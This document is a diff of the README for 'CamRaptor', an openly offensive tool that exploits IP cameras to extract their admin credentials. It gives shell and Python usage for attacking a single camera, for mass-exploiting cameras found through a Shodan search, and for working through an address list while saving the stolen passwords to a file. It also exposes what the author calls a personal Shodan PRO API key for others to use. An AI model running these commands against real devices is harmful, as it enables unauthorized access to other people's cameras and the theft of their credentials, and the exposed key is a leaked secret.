@@ -38,52 +38,25 @@ optional arguments:
 
 ### Examples
 
+**Exploiting single camera**
+
 Let's hack my camera just for fun.
 
 ```shell
 camraptor -a 192.168.99.100
 ```
 
-**output:**
+**Exploiting cameras from Internet**
+
+Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.
 
 ```shell
-[*] (192.168.99.100) - connecting to camera...
-[*] (192.168.99.100) - accessing camera config...
-[*] (192.168.99.100) - extracting camera credentials...
-[i] (192.168.99.100) - admin:mamahacker123
-```
-
-Let's try to use Shodan search engine to exploit cameras over Internet and save all obtained passwords to `passwords.txt`, we will use it with `-t` for fast exploitation.
-
-```shell
-camraptor -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
+camraptor -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD
 ```
 
 **NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)
 
-**output:**
-
-```shell
-[*] Authorizing Shodan by given API key...
-[+] Authorization successfully completed!
-[*] Initializing thread #0...
-[*] (x.x.x.x) - connecting to camera...
-[*] Initializing thread #1...
-[*] (x.x.x.x) - connecting to camera...
-[*] Initializing thread #2...
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #0 completed.
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #1 completed.
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #2 completed.
-```
+**Exploiting cameras from input file**
 
 Let's try to use opened database of cameras with `-t` for fast exploitation.
 
@@ -92,28 +65,6 @@ camraptor -t -i cameras.txt -o passwords.txt
 ```
 
 **NOTE:** It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.
-
-**output:**
-
-```shell
-[*] Initializing thread #0...
-[*] (x.x.x.x) - connecting to camera...
-[*] Initializing thread #1...
-[*] (x.x.x.x) - connecting to camera...
-[*] Initializing thread #2...
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #0 completed.
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #1 completed.
-[*] (x.x.x.x) - connecting to camera...
-[*] (x.x.x.x) - accessing camera config...
-[*] (x.x.x.x) - extracting camera credentials...
-[i] Thread #2 completed.
-```
 
 ## CamRaptor API
 
@@ -127,24 +78,19 @@ from camraptor import CamRaptor
 
 There are all CamRaptor basic functions that can be used to exploit specified camera.
 
-* `connect(host)` - Connect specified camera by network address.
-* `exploit(camera)` - Exploit connected camera.
+* `exploit(address)` - Exploit single camera by given address.
 
 ### Examples
+
+**Exploiting single camera**
 
 ```python
 from camraptor import CamRaptor
 
 camraptor = CamRaptor()
+creds = camraptor.exploit('192.168.99.100')
 
-camera = camraptor.connect('192.168.99.100')
-print(camraptor.exploit(camera))
-```
-
-**output:**
-
-```shell
-'mamahacker123'
+print(creds)
 ```
 
 ## Other tools
